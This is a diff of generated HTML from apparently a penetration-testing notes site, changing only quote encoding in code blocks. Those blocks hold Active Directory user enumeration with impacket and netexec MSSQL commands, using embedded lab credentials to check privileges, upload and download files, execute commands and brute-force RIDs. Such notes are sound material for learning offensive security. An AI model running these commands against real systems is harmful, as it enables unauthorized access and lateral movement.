@@ -26790,7 +26790,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="c1"># In case you are missing some modules:</span>
 </span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a>pip3<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
 </span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="c1"># In case you don&#39;t have pip3 (pip for Python3) installed, or Python3, install it with the following commands</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="c1"># In case you don't have pip3 (pip for Python3) installed, or Python3, install it with the following commands</span>
 </span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>python3<span class="w"> </span>python3-pip
 </span></code></pre></div></td></tr></table></div>
 <h2 id="basic-tools-included">Basic tools included</h2>
@@ -26848,7 +26848,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a># Print AD users
 </span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>impacket-GetADUsers -all zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.219.158 | tee impacketusers.txt
 </span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a># And with the users.txt obtained, generate a list:
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a>cat impacketusers.txt | grep -vE &#39;^(\[\*\]|Name|-)&#39; | sed &#39;s/ .*//&#39; | tee domainusers.txt
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a>cat impacketusers.txt | grep -vE '^(\[\*\]|Name|-)' | sed 's/ .*//' | tee domainusers.txt
 </span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>
 </span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>
 </span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a>
@@ -27206,23 +27206,23 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-2-160"><a id="__codelineno-2-160" name="__codelineno-2-160"></a># Works even if account password changes (until KRBTGT rotates)
 </span></code></pre></div></td></tr></table></div>
 <h3 id="impacket-mssql">impacket-mssql</h3>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>nxc mssql 10.129.18.220 -u kevin -p &#39;iNa2we6haRj2gaw!&#39; --local-auth  -q &#39;SELECT name FROM master.dbo.sysdatabases;&#39;
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth  -q 'SELECT name FROM master.dbo.sysdatabases;'
 </span></code></pre></div></td></tr></table></div>
 <p>Use impacket to check privileges:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>nxc mssql 10.129.18.220 -u kevin -p &#39;iNa2we6haRj2gaw!&#39; --local-auth -M mssql_priv
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -M mssql_priv
 </span></code></pre></div></td></tr></table></div>
 <p>Impersonate:</p>
 <p>Upload:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>nxc mssql 10.129.18.220 -u kevin -p &#39;iNa2we6haRj2gaw!&#39; --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!' --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt
 </span></code></pre></div></td></tr></table></div>
 <p>Download:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>nxc mssql 10.129.18.220 -u kevin -p &#39;iNa2we6haRj2gaw!&#39;  --get-file C:\\Windows\\Temp\\whoami.txt /tmp/file
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!'  --get-file C:\\Windows\\Temp\\whoami.txt /tmp/file
 </span></code></pre></div></td></tr></table></div>
 <p>Run commands:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>nxc mssql 10.129.18.220 -u kevin -p &#39;iNa2we6haRj2gaw!&#39; --local-auth -x whoami
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -x whoami
 </span></code></pre></div></td></tr></table></div>
 <p>Enumerate users by bruteforcing RID:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>nxc mssql 10.129.18.220 -u kevin -p &#39;iNa2we6haRj2gaw!&#39; --local-auth --rid-brute
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
